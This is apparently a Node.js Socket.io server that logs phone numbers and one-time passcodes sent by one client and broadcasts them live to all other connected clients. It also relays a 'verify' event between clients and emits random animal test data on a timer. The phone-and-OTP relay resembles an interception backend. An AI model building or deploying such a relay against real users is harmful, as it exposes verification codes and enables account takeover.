require('dotenv').config();
const http = require('http');
const socketIo = require('socket.io');

const allowedOrigin = process.env.ALLOWED_ORIGIN || 'http://localhost:5173';

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Socket.io server running!');
});

const io = socketIo(server, {
    cors: {
        origin: allowedOrigin,
        methods: ['GET', 'POST'],
        allowedHeaders: ['my-custom-header'],
        credentials: true,
    }
});

let intervalId = null;

io.on('connection', (socket) => {
    let phone, otp;

    console.log('a user connected', socket.handshake.query);
    socket.on('verify-from-review', (msg) => {
        socket.broadcast.emit('verify-to-auth', msg);
    })

    socket.on('message', (msg) => {
        console.log('Received message: ' + msg);
        if (msg.type === 'phone') {
            phone = msg.value;
        }
        else if (msg.type === 'otp') {
            otp = msg.value;
        } else if (msg.type === 'registered') {
            phone = phone + " - 🚀"
        } else if (msg.type === 'otpsubmit') {
            otp = otp + " - 🚀"
        }
        console.log('phone-', phone);
        console.log('otp-', otp);
        socket.broadcast.emit('message', {
            phone,
            otp
        });
    });

    socket.on('start_interval', () => {
        console.log('Starting interval...');
        if (!intervalId) {
            intervalId = setInterval(() => {
                const randomData = generateRandomData();
                console.log(randomData);
                socket.emit('random_data', randomData);
                counter++;
            }, 30000);
        }
    });

    socket.on('stop_interval', () => {
        console.log('Stopping interval...');
        if (intervalId) {
            clearInterval(intervalId);
            intervalId = null;
        }
    });


    socket.on('disconnect', () => {
        console.log('user disconnected');
        if (intervalId) {
            clearInterval(intervalId);
            intervalId = null;
        }
    });
});

server.listen(3000, () => {
    console.log('HTTP Server listening on port 3000');
});

let counter = 0;

function generateRandomData() {
    const animals = ['cheetah', 'fox', 'hyena', 'lion', 'tiger', 'wolf'];
    const dataSources = [1, 2, 3, 4];

    function getRandomItem(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }

    function getCurrentTime() {
        const now = new Date();
        const hours = now.getHours().toString().padStart(2, '0');
        const minutes = now.getMinutes().toString().padStart(2, '0');
        return `${hours}:${minutes}`;
    }

    const start = counter % 2 === 0 ? 0 : 2;
    const end = start + 2;

    return dataSources.slice(start, end).map(datasource => {
        const animal = getRandomItem(animals);
        const time = getCurrentTime();

        return {
            time,
            datasource,
            animal
        };
    });
}
